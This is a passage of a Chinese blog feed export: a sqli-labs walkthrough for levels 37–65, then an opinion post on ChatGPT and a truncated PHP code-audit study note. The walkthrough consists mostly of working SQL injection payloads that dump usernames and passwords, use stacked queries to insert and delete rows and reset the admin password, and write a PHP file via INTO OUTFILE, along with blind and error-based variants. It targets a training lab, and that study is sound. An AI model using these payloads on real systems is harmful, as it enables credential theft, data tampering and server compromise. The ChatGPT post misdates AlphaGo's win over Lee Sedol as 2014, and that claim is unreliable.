plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li></ol><ul><li>第37关<br>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</li></ul><h2 id="38-41-堆叠注入"><a href="#38-41-堆叠注入" class="headerlink" title="38-41(堆叠注入)"></a>38-41(堆叠注入)</h2><ol><li>测试并判断注入类型<br>首先查看源码，发现这样一条语句<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用分号分隔的SQL语句。<br>详细可见：<a href="https://www.php.net/manual/zh/mysqli.multi-query.php#:~:text=mysqli_multi_query%20%28mysqli%20%24link%2C%20string%20%24query%29%3A%20bool%20%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%20SQL,%E8%AF%AD%E5%8F%A5%E3%80%82%20%E8%A6%81%E8%8E%B7%E5%BE%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20mysqli_use_result%20%28%29%20%E6%88%96%20mysqli_store_result%20%28%29%20%E5%87%BD%E6%95%B0%E3%80%82">mysqli_multi_query</a></li></ol><p>那么，当我们看到这条语句时，就可以注意能否使用<strong>堆叠注入</strong>了。<br>所谓堆叠注入，简单地说，是能够同时注入多条语句。<br>实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li><li><p>增删改<br>这里示例一个增，也即为插入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);</span><br><span class="line">?id=100</span><br></pre></td></tr></table></figure><p>先后输入这两条语句，可以看到插入成功<br>示例一个删</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) ;delete from users where id=1;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第39关<br>与第38关相比差不多，只不过第39关不需要单引号</p></li><li><p>第40关<br>与第38关相比差不多，只不过第40关的闭合方式是’)</p></li><li><p>第41关<br>与38关差不多，也可堆叠注入</p></li></ul><h2 id="42-45-联合注入或堆叠注入"><a href="#42-45-联合注入或堆叠注入" class="headerlink" title="42-45(联合注入或堆叠注入)"></a>42-45(联合注入或堆叠注入)</h2><ol><li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure><p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure></li><li><p>修改管理员密码(可以直接做)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第43关<br>与第42关差不多，只不过闭合方式为’)</p></li><li><p>第44关<br>与第42关差不多，只是不能使用报错注入</p></li><li><p>第45关<br>与第43关差不多，只是闭合方式为’)</p></li></ul><h2 id="46-47-报错注入和读写文件"><a href="#46-47-报错注入和读写文件" class="headerlink" title="46-47(报错注入和读写文件)"></a>46-47(报错注入和读写文件)</h2><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1</span><br></pre></td></tr></table></figure><p>显示有id,username,password的表格<br>可以直接得到需要的信息，但在实际情况中，这样是不够的。<br>也可以倒序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 desc</span><br></pre></td></tr></table></figure><p>这里可用的注入方式很多<br>报错注入，时间盲注，双查询注入，函数注入<br>下面以报错注入为例</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">?sort=-1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p>写入查询记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure><p>用十六进制代替<?php phphinfo();?></p></li></ol><ul><li>第47关<br>与第46关相比差不多，只是闭合方式为’</li></ul><h2 id="48-53-布尔盲注"><a href="#48-53-布尔盲注" class="headerlink" title="48-53(布尔盲注)"></a>48-53(布尔盲注)</h2><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure><p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第49关<br>与第48关相比差不多，只是闭合方式为’</p></li><li><p>第50关<br>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p></li><li><p>第51关<br>与第50关相比差不多，只是闭合方式为’</p></li><li><p>第52关<br>与第50关相比差不多</p></li><li><p>第53关<br>与第51关相比差不多</p></li></ul><h2 id="54-57-完结训练"><a href="#54-57-完结训练" class="headerlink" title="54-57(完结训练)"></a>54-57(完结训练)</h2><ol><li><p>测试并判断注入类型<br>就像回到了开始~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1  显示正常</span><br><span class="line">?id=1&#x27;  无错误信息，但显示不正常</span><br></pre></td></tr></table></figure><p>推测闭合方式为’</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 4 --+  无错误信息，但显示不正常</span><br><span class="line">?id=1&#x27;order by 3 --+  显示正常</span><br></pre></td></tr></table></figure><p>字段数为3</p></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenages&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;8k8nkr7hq5&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(secret_2GAF),3 from 8k8nkr7hq5 --+</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第55关<br>与第54关差不多，闭合方式变更为)</p></li><li><p>第56关<br>与第54关差不多，闭合方式变更为’)</p></li><li><p>第57关<br>与第54关差不多，闭合方式变更为”</p></li></ul><h2 id="58-65-完结训练"><a href="#58-65-完结训练" class="headerlink" title="58-65(完结训练)"></a>58-65(完结训练)</h2><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  显示报错信息</span><br></pre></td></tr></table></figure><p>由此闭合方式为’<br>因为只有5次机会，所以我们采用报错注入比较快</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;6ykqspiws7&#x27; limit 2,1),0x7e),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select secret_K2GB from 6ykqspiws7),0x7e),1) --+</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第59关<br>与第58关相比差不多，只是闭合方式没有单引号</p></li><li><p>第60关<br>与第58关相比差不多，只是闭合方式为id&#x3D;-1”)</p></li><li><p>第61关<br>与第58关相比差不多，只是闭合方式为id&#x3D;-1’))</p></li><li><p>第62关<br>时间盲注，闭合方式’)</p></li><li><p>第63关<br>时间盲注，闭合方式’</p></li><li><p>第64关<br>时间盲注，闭合方式))</p></li><li><p>第65关<br>时间盲注，闭合方式”)</p></li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>sqli-labs只是SQL注入的开始。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本次为sqli-labs的合集，为了方便。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>Chat GPT--AI时代来临</title>
    <link href="http://example.com/2023/01/03/AI%E6%97%B6%E4%BB%A3%E6%9D%A5%E4%B8%B4/"/>
    <id>http://example.com/2023/01/03/AI%E6%97%B6%E4%BB%A3%E6%9D%A5%E4%B8%B4/</id>
    <published>2023-01-02T16:00:00.000Z</published>
    <updated>2023-01-06T17:15:48.088Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>世界在发展，被抛弃的，是不跟随的人。</p><span id="more"></span><h1 id="新时代的标志"><a href="#新时代的标志" class="headerlink" title="新时代的标志"></a>新时代的标志</h1><p>未来将会是AI的天下，我认为这毋庸置疑。<br>让我们来回顾一下吧。暂且不说那些比较久远且人们没什么印象的事件了。</p><ol><li>2014年，谷歌推出了“AlphaGo”，这是一种基于深度学习的围棋AI，它成功击败了世界围棋冠军李世石。</li><li>2022年，AI绘画出现在大众眼中，并且迅速改变人们对于AI绘画的看法。</li><li>2022年11月，Chat GPT被推出，迅速引爆整个互联网，两个月注册次数已经超过了1亿次。</li></ol><p>这是近年来比较为大众所知的事件。可以明显看出，AI在大众面前出现得越来越频繁，且正在逐渐改变人们的认知与使用方式。<br>我们知道，AI是为了提高工作效率和质量并减少人力成本而被创造出来的，现在这个目的正在逐步成为现实。这也意味着，有大量的人将不再被需要，未来人与人之间的竞争将更加激烈。为了避免自己最终沦落到那个地步，必须紧跟时代步伐！<br>如果说，2014年AI终结了围棋只是一个方面的应用，那么2022年出现的AI正在逐渐渗透到各个领域。要么被抛弃，要么驾驭AI。我们别无选择。</p><h1 id="需要改变的人"><a href="#需要改变的人" class="headerlink" title="需要改变的人"></a>需要改变的人</h1><p>哪些人需要改变，顺应时代的变化呢？</p><h2 id="年龄层面"><a href="#年龄层面" class="headerlink" title="年龄层面"></a>年龄层面</h2><p>首先，从年龄层面来说，我认为<strong>60岁以下</strong>的人都非常需要重视AI。划分60岁这个年龄段，是因为大多数人在60岁左右退休或是无法再投注更多精力到事业上。<br>并不是说60岁以上的人就不需要在意，他们也需要去在意，因为从目前来看，<strong>Chat GPT 3.0</strong>实际上已经是一个能够基本满足日常使用的AI了，搜索资料，解答问题，聊天唠嗑，甚至帮助完成一些方面的事务也是能够做到的。<br>60岁以上的人需要了解的方式，是和60岁以下的人不同的。区别在于，中老年人更多是需要了解如何使用，在日常生活中获得更多便利。而60岁以下的绝大多数人，了解使用方式只是入门，还必须利用AI来更高效地学习工作。避免自己被抛弃！</p><h2 id="财富多寡"><a href="#财富多寡" class="headerlink" title="财富多寡"></a>财富多寡</h2><p>无论财富多寡，AI都必须要深入了解。富人更需要了解，世界的财富并非一成不变的聚集在某些人手中，不愿改变的人即便暂时拥有财富，最终也会一无所有。因此越来越多的富人家族反而更加去了解前沿的事物。掌握最新的真实消息是避免被时代抛弃的不可或缺的方式之一。AI也一定会成为富人家族重视的前沿科技之一，或用于公司企业，或用于提升教育质量。无论如何，AI一定会被广泛地用于各个方面，没有做不到，只有想不到。<br>普通人的方式更像是挣扎在生存边缘。人一生都在做选择，有时一个选择错误，会导致落后很多，甚至一辈子都落后于人。既然已经知道未来的时代是AI的时代，那就不能坐以待毙！</p><h1 id="保持竞争力"><a href="#保持竞争力" class="headerlink" title="保持竞争力"></a>保持竞争力</h1><p>首先需要了解AI的发展趋势，我在这里列出以下6点：</p><ol><li>深度学习和神经网络技术的发展：深度学习和神经网络技术使人工智能能够以更加人类化的方式理解和处理数据。</li><li>自然语言处理技术的发展：自然语言处理技术使人工智能能够理解和生成自然语言，使机器能够与人类更自然地交流。</li><li>自动驾驶技术的发展：自动驾驶技术使汽车能够自主驾驶，这将会改变交通运输的方式。</li><li>增强现实和虚拟现实技术的发展：增强现实和虚拟现实技术使人类能够更直接地与虚拟世界互动，并可能在许多领域提供新的应用。</li><li>机器人技术的发展：机器人技术使机器能够自主完成许多工作，并可能在许多领域提供新的应用。</li><li>云计算和大数据技术的发展：云计算和大数据技术使人工智能能够处理更多的数据，从而提高其准确性和效率。</li></ol><p>接下来是AI很难模仿的技能：</p><ol><li>创造力：人类具有创造性思维的能力，能够想出新的想法和解决方案。人工智能目前难以模仿这种能力。</li><li>关爱他人：人类具有同情心和关爱他人的能力，能够体谅他人的情感并给予帮助。人工智能目前难以模仿这种能力。</li><li>表达情感：人类能够用不同的方式表达自己的情感，例如语言、面部表情、肢体动作等。人工智能目前难以模仿这种能力。</li><li>在团队中发挥作用：人类能够在团队中发挥作用，通过协作和沟通完成任务。人工智能目前难以模仿这种能力。</li><li>思考和决策：人类具有独立思考和决策的能力，能够根据不同的情况做出适当的决策。人工智能目前难以模仿这种能力。</li></ol><p>然而，随着人工智能技术的发展，这些技能也可能在未来被模仿。因此，为了在人工智能时代中保持竞争力，需要不断学习新技能并发展自己的创造力和独特的技能。<br>最后是如何深度使用AI：</p><ol><li>学习相关知识：学习人工智能相关的知识，包括机器学习、神经网络、自然语言处理等，可以帮助你更好地理解人工智能的原理和应用。</li><li>尝试不同的人工智能工具和平台：使用不同的人工智能工具和平台，如 TensorFlow、PyTorch、Scikit-learn 等，可以帮助你了解人工智能的应用方法和流程。</li><li>结合实际应用场景使用人工智能：结合实际的应用场景使用人工智能，如为某个公司制定市场营销策略，为某个医院建立诊断模型等，可以帮助你了解人工智能在实际应用中的效果。</li><li>参加相关培训和课程：参加相关的培训和课程，如人工智能开发课程、机器学习课程等，可以帮助你更好地掌握人工智能的应用方法。</li><li>参与社区和项目：参与社区和项目，如参加人工智能研讨会、参与开源项目等，可以帮助你与其他人工智能开发者交流经验，并有机会学习新的技能。</li></ol><p>也就是说，凡是容易被AI模仿学习的，未来都将会轻易被取代。即便比较困难的，也将会淘汰掉大部分底层工作者。<br>举例而言，绘画算是AI学习比较困难的一方面，然而发展到现在的大众程度，虽说不至于无法分辨AI，起码也能让人对生成的AI画作不至于排斥。<br>现如今已有很多对绘画方面有需求的从业者开始放弃画师，转而使用AI绘画降低成本。即使如此AI仍在前进，未来将会不断完善算法，不断达到几乎无法分辨的程度。到那时，除了顶级画师能够胜过AI，其他人要么收入大幅降低，要么转行。更现实的情景是，画师与AI共存，AI不断生成画作，画师从中寻得灵感，或者干脆从AI生成的画作上稍作修改。无法否认的是，源于AI带来的成本降低，画师的人数和收入也会跟着降低。<br>编程方面大量程序员将被取代，这是板上钉钉的事。事实上，刚入门编程时，我就有这种预感了。如今被Chat GPT明确了当的实现了也算是毁灭了所有的幻想。听说已经有一部分程序员因Chat GPT的诞生而丢掉了工作，而未来更强力的AI正在创造中，当大部分企业公司反应过来后将AI大规模应用在工作实践中，没有准备好的人将被无情淘汰。<br>如同工业革命，从传统的手工纺织，最终变成了人使用机器纺织。不断有旧的行业消失，也不断有新的行业产生。社会在变革，但无论如何，机会不属于未准备好的人，唯有保持竞争力，才能留有一席之地。</p><h1 id="隐忧"><a href="#隐忧" class="headerlink" title="隐忧"></a>隐忧</h1><p>实际上，当AI被成熟运用后，大部分行业的效率将在现在的基础上提升百倍都不止，我们将很难想象，未来社会的变化有多么快，有多少的朝花夕拾。这颗星球，已很难再容纳如此多的人口了，因为大量的人都比不上AI，没有人愿意雇用效率远低于AI的人。存在最稳定的职业是只有人才能胜任的工作，比如运动员，演员。<br>我曾以为，迁移至另一颗星球会是人们的自发行为，现在看来我错了，这很可能是被迫行为。至2040年，会有大量的底层人找不到合适的工作而被迫开拓火星，并且将一去不复返。这副光景，让我想起了曾经逃难去开发美国西部的人。再过若干年，不难想象，歧视将会从肤色跨越到星球，火星人将是低劣的，地球人将是高贵的。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>历史总是螺旋上升。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;世界在发展，被抛弃的，是不跟随的人。&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>代码审计期末专题</title>
    <link href="http://example.com/2023/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/"/>
    <id>http://example.com/2023/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</id>
    <published>2022-12-31T16:00:00.000Z</published>
    <updated>2023-01-02T16:58:44.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考试即将到来，复习刻不容缓。复习题由某群友整理得到。</p><span id="more"></span><h1 id="第1套试题"><a href="#第1套试题" class="headerlink" title="第1套试题"></a>第1套试题</h1><h2 id="第1题"><a href="#第1题" class="headerlink" title="第1题"></a>第1题</h2><p>在PHP中，数据会自动转换类型后再进行比较。</p><h3 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h3><p>检查数组中是否存在某个值，字符串区分大小写。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>在haystack中搜索needle，如果没有设置strict则使用宽松比较。<br>如果strict参数的值为true则in_array()函数还会检查needle的类型是否和haystack中的相同。<br>注意：在PHP 8.0.0 之前，string needle在非严格模式下将会匹配数组中的0，反之亦然。<br>返回值：如果找到needle则返回true，否则返回false<br><a href="https://www.php.net/manual/zh/function.in-array.php">in_array</a></p><h3 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h3><p>检查变量是否为数字或数字字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>返回值：如果value是数字或数字字符串，返回true，否则返回false<br><a href="https://www.php.net/manual/zh/function.is-numeric.php">is_numeric</a></p><h2 id="第2题"><a href="#第2题" class="headerlink" title="第2题"></a>第2题</h2><h3 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a>extract()函数</h3><p>从数组中将变量导入到当前的符号表。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = EXTR_OVERWRITE, <span class="keyword">string</span> <span class="variable">$prefix</span> = <span class="string">&quot;&quot;</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure><ul><li>参数<br>array是一个关联数组。此函数会将键名当作变量名，值作为变量的值。对每个键&#x2F;值对都会在当前的符号表中建立变量，并受到flags和prefix的影响。必须使用关联数组，数字索引的数组将不会产生结果，除非用了EXTR_PREFIX_ALL或者EXTR_PREFIX_INVALID。<br>flags<br>对待非法&#x2F;数字和冲突的键名的方法将根据取出标记flags参数决定。可以是以下值之一：<br>EXTR_OVERWRITE如果有冲突，覆盖已有的变量<br>EXTR_SKIP如果有冲突，不覆盖已有的变量<br>EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀prefix<br>EXTR_PREFIX_ALL给所有变量名加上前缀prefix<br>EXTR_PREFIX_INVALID仅在非法&#x2F;数字的变量名前加上前缀prefix<br>EXTR_PREFIX_IF_EXISTS仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>EXTR_REFS将变量名作为引用提取。<br>如果没有指定flags，则被假定为EXTR_OVERWRITE<br>prefix，注意prefix仅在flags的值是EXTR_PREFIX_SAME,EXTR_PREFIX_ALL,EXTR_PREFIX_INVALID或EXTR_PREFIX_EXISTS时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。</li></ul><p>返回值，返回成功导入到符号表中的变量数目。</p><p><a href="https://www.php.net/manual/zh/function.extract">extract</a></p><h2 id="第3题"><a href="#第3题" class="headerlink" title="第3题"></a>第3题</h2><h3 id="error-reporting-函数"><a href="#error-reporting-函数" class="headerlink" title="error_reporting()函数"></a>error_reporting()函数</h3><p>设置应该报告何种PHP错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ 